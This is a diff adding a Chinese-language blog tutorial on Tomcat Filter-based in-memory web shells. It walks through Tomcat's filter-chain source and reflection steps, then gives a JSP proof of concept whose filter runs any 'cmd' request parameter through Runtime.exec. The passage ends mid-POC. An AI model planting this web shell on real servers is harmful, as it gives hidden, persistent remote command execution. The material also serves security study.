+        StandardContext context \<span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> \<span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// If there are no filter mappings, we are done</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>filterMaps \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>filterMaps<span class="token punctuation">.</span>length \<span class="token operator">=</span>\<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> filterChain<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Acquire the information we will need to match filter mappings</span>
+        DispatcherType dispatcher \<span class="token operator">=</span>
+                <span class="token punctuation">(</span>DispatcherType<span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>DISPATCHER\_TYPE\_ATTR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String requestPath \<span class="token operator">=</span> null<span class="token punctuation">;</span>
+        Object attribute \<span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>Globals<span class="token punctuation">.</span>DISPATCHER\_REQUEST\_PATH\_ATTR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>attribute <span class="token operator">!</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            requestPath \<span class="token operator">=</span> attribute<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        String servletName \<span class="token operator">=</span> wrapper<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// Add the relevant path-mapped filters to this filter chain</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>FilterMap filterMap <span class="token operator">:</span> filterMaps<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchDispatcher</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> dispatcher<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchFiltersURL</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> requestPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            ApplicationFilterConfig filterConfig \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>
+                    context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfig \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// FIXME - log configuration problem</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Add filters that match on servlet name second</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>FilterMap filterMap <span class="token operator">:</span> filterMaps<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchDispatcher</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> dispatcher<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">matchFiltersServlet</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">,</span> servletName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            ApplicationFilterConfig filterConfig \<span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>
+                    context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfig \<span class="token operator">=</span>\<span class="token operator">=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// FIXME - log configuration problem</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Return the completed filter chain</span>
+        <span class="token keyword">return</span> filterChain<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>简化一下逻辑就是这样：</p>
+<pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>	filterChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	创建一个ApplictionFilterChain对象
+<span class="token number">2</span><span class="token punctuation">.</span>	StandardContext context <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	获取当前进程Context
+<span class="token number">3</span><span class="token punctuation">.</span>	FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  通过Context获取所有过滤器
+<span class="token number">4</span><span class="token punctuation">.</span>	ApplicationFilterConfig filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	获取filterConfig
+<span class="token number">5</span><span class="token punctuation">.</span>	filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span> 添加过滤器
+</code></pre>
+<p>一个小知识：一个<code>filterConfig</code>​对应一个filter，但是一个filter可以有多个<code>filterConfig</code>​</p>
+<p>这里需要了解一下FilterMap和FilterConfig</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104134-sfasxfo.png" alt="image">​</p>
+<p>filterMap主要存储的是urlPatterns和filterName这些信息</p>
+<p>恰好对应配置的这些标签：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>filterConfig存储的是filterDef，filterDef下有filterClass和filterName这些信息</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303104918-hnewqap.png" alt="image">​</p>
+<p>filterDef这两项配置对应的恰好就说注册表里面的配置：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>因此构造恶意的Filter就需要注册这些信息才能使得Filter生效</p>
+<pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span>	filterChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	创建一个ApplictionFilterChain对象
+<span class="token number">2</span><span class="token punctuation">.</span>	StandardContext context <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span> wrapper<span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	获取当前进程Context
+<span class="token number">3</span><span class="token punctuation">.</span>	FilterMap filterMaps<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">findFilterMaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  通过Context获取所有过滤器
+<span class="token number">4</span><span class="token punctuation">.</span>	ApplicationFilterConfig filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">)</span>context<span class="token punctuation">.</span><span class="token function">findFilterConfig</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	获取filterConfig
+<span class="token number">5</span><span class="token punctuation">.</span>	filterChain<span class="token punctuation">.</span><span class="token function">addFilter</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span> 添加过滤器
+</code></pre>
+<h3 id="第一步-获取ServletContext"><a href="#第一步-获取ServletContext" class="headerlink" title="第一步 获取ServletContext"></a>第一步 获取ServletContext</h3><p>其实第一步是和上面原生的一样创建ApplicationFilterChain对象，但是创建ApplicationFilterChain对象需要反射获取他的Context。所以第一步还是需要从request获取StandardContext</p>
+<pre class=" language-jsp"><code class="language-jsp">    Field requestField = request.getClass().getDeclaredField("request");
+    requestField.setAccessible(true);
+    Request requestImp = (Request) requestField.get(request);
+    StandardContext standardContext = (StandardContext)requestImp.getContext();
+</code></pre>
+<p>还有另一种获取StandardContext的方式，Tomcat启动会为每个环境创建Session、Cookie等信息，都由StandardContext控制</p>
+<p>所以可以利用<code>request.getSession().getServletContext()</code>​获取，但是<code>request.getSession().getServletContext()</code>​只是得到了ApplicationContext，还需要再反射一次才能获取StandardContext，比较麻烦，如下图所示</p>
+<p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303154255-5jyu8c0.png" alt="image">​</p>
+<h3 id="第二步-设置FilterDef"><a href="#第二步-设置FilterDef" class="headerlink" title="第二步 设置FilterDef"></a>第二步 设置FilterDef</h3><pre class=" language-java"><code class="language-java">    FilterDef filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>‍</p>
+<h3 id="第三步-设置FilterMap"><a href="#第三步-设置FilterMap" class="headerlink" title="第三步 设置FilterMap"></a>第三步 设置FilterMap</h3><pre class=" language-java"><code class="language-java">    FilterMap filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span>DispatcherType<span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调度器类型设置为处理客户端请求</span>
+    standardContext<span class="token punctuation">.</span><span class="token function">addFilterMap</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p><code>DispatcherType</code>​ 是一个枚举类型，它定义了 Servlet 中的请求调度器类型。在这里<code>.REQUEST</code>​ 表示该过滤器将被调度处理来自客户端的请求</p>
+<h3 id="第四步-包装FilterDef和FilterConfig"><a href="#第四步-包装FilterDef和FilterConfig" class="headerlink" title="第四步 包装FilterDef和FilterConfig"></a>第四步 包装FilterDef和FilterConfig</h3><pre class=" language-jsp"><code class="language-jsp">    Constructor<ApplicationFilterConfig> applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+    applicationFilterConfigConstructor.setAccessible(true);
+    ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);
+
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
+    filterConfigs.put("ServletFilter", applicationFilterConfig);
+</code></pre>
+<p>这一步的关键代码看StandardContext的<code>filterStart</code>​方法的16，17，18三行：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">filterStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Starting filters"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// Instantiate and record a FilterConfig for each defined filter</span>
+        <span class="token keyword">boolean</span> ok <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            filterConfigs<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>FilterDef<span class="token operator">></span> entry <span class="token operator">:</span> filterDefs<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                String name <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">" Starting filter '"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    ApplicationFilterConfig filterConfig <span class="token operator">=</span>
+                            <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    t <span class="token operator">=</span> ExceptionUtils<span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    ExceptionUtils<span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>
+                            <span class="token string">"standardContext.filterStart"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    ok <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> ok<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.servlet.annotation.WebFilter"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>
+    <span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>
+
+        <span class="token annotation punctuation">@Override</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>
+            Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token annotation punctuation">@Override</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest request<span class="token punctuation">,</span> ServletResponse response<span class="token punctuation">,</span> FilterChain chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>
+            String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token annotation punctuation">@Override</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token operator">%</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">%</span>
+    Field requestField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Request requestImp <span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    StandardContext standardContext <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span>requestImp<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    ServletFilter servletFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">//FilterDef</span>
+    FilterDef filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">//FilterMap</span>
+    FilterMap filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span>DispatcherType<span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调度器类型设置为处理客户端请求</span>
